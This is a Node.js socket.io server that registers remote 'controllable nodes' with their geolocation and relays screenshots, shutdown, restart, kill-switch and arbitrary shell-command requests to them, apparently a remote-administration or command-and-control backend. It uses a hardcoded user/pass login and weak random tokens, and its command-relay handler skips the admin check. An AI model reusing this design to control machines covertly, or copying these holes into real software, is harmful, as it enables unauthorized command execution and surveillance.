function log(message){
  var today = new Date();
  var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  console.log(today.getDate() + "-" + (today.getMonth() + 1) + "-" + today.getFullYear() + " at " + time + " - System Log\n>_ " + message + "\n")
}



var express = require('express');

var app = express();

var server = app.listen(1010);

// app.use(express.static('public'));
//
// app.get('/', function(req, res){
//   res.sendFile('public/index.html');
// });

var socket = require('socket.io');

var io = socket(server);

clients = {};

admins = {};

function isAdmin(id, data){
  if(Object.keys(admins).includes(id)){
    if(admins[id].token == data.token && admins[id].authed){
      return true;
    }
  }
  return false;
}

io.sockets.on('connection', function(socket){
  socket.on("init", function(data){
    if(data.type == "admin"){

      data.authed = false;

      data.id = socket.id;

      admins[socket.id] = data
      // Admin login
      var user = data.username;
      var pass = data.password;

      // Add proper data store
      if(user == "user" && pass == "pass"){
        data.authed = true;
        var token = Math.floor(Math.random()*16777215).toString(16)+Math.floor(Math.random()*16777215).toString(16)+Math.floor(Math.random()*16777215).toString(16);
        data.token = token;
        socket.emit("token", token);
        data.socket = socket;
        admins[socket.id] = data;
        log("Connected ADMIN: '" + admins[socket.id].name + "' |  IP: " + admins[socket.id].geolocation.query + " | ID: " + socket.id);
        if(Object.keys(admins).length == 1){
          log("There is now 1 admin connected.");
        }
        else{
          log("There are now " + Object.keys(admins).length + " admins connected.");
        }

      }

      else{
        socket.emit("disconnect")
      }
    }

    else{
      data.socket = socket;
      data.id = socket.id;
      clients[socket.id] = data;
      log("Connected NODE: '" + clients[socket.id].name + "' |  IP: " + clients[socket.id].geolocation.query + " | ID: " + socket.id);
      if(Object.keys(clients).length == 1){
        log("There is now 1 controllable node connected.");
      }
      else{
        log("There are now " + Object.keys(clients).length + " controllable nodes connected.");
      }
    }
  });

  socket.on("admin:getnodes", function(data){
    var clientsmin = [];
    if(isAdmin(socket.id, data)){
      clientsmin = [];
      for(var client of Object.values(clients)){
        delete client["socket"];
        clientsmin.push(client);
      }
      //socket.emit("clients", Object.values(clients));
      socket.emit("clients", clientsmin);
    }
  });

  socket.on("admin:kill_node", function(data){
    if(isAdmin(socket.id, data)){
      io.sockets.connected[data.nodeid].emit("kill_switch", {"timer":data["timer"]});
    }
    else{
      log("Admin check failed...");
    }




  });

  socket.on("admin:shutdown_node", function(data){
    if(isAdmin(socket.id, data)){
      log("Admin: '" + admins[socket.id].name + "' shutting down node: '" + clients[data.nodeid].name + "'.")
      io.sockets.connected[data.nodeid].emit("shutdown", {"timer":data["timer"]});
    }
    else{
      log("Admin check failed...");
    }




  });

  socket.on("admin:screenshot", function(data){
    log("Admin requested SC");
    if(isAdmin(socket.id, data)){
      io.sockets.connected[data.nodeid].emit("screenshot", {"admin":socket.id});
    }
    else{
      log("Admin check failed...");
    }




  });

  socket.on("node:screenshot", function(data){
    log("Received screenshot from client, sending back to admin.")
    io.sockets.connected[data.admin].emit("screenshot", {"raw_file":data.raw_file, "base_filename":data.base_filename, "node":clients[socket.id]});
  });



  socket.on("admin:restart_node", function(data){
    if(isAdmin(socket.id, data)){
      io.sockets.connected[data.nodeid].emit("restart", {"timer":data["timer"]});
    }
    else{
      log("Admin check failed...");
    }




  });


  socket.on("disconnect", function(){
    var clientinfo = {};
    if(Object.keys(clients).includes(socket.id)){
      clientinfo = clients[socket.id];
      delete clients[socket.id];
    }
    else if(Object.keys(admins).includes(socket.id)){
      clientinfo = admins[socket.id];
      delete admins[socket.id];
    }


    if(clientinfo.type == "node"){
      log("Lost connection with client " + clientinfo.name + " with IP " + clientinfo.geolocation.query + ".");
      log("Connected Clients Count: " + Object.keys(clients).length);
    }
    else if(clientinfo.type == "admin" && clientinfo.authed){
      log("Lost connection with admin " + clientinfo.name + " with IP " + clientinfo.geolocation.query + ".");
      log("Connected Admins Count: " + Object.keys(admins).length);
    }
  });
  socket.on("admin:run_command", function(data){
    for(var idOfNode of Object.keys(clients)){
      log("Admin '" + admins[socket.id].name + "' sent command: '" + data.command + "' to client: " + clients[idOfNode].name + ".");
    }
    io.sockets.connected[data.nodeid].emit("run_command", {
      "command":data.command,
      "adminID":socket.id
    });
  });
  socket.on("client:console_output", function(data){
    io.sockets.connected[data.adminID].emit("console_output", {
      "name":clients[socket.id].name,
      "out":data.output
    });
  });
});
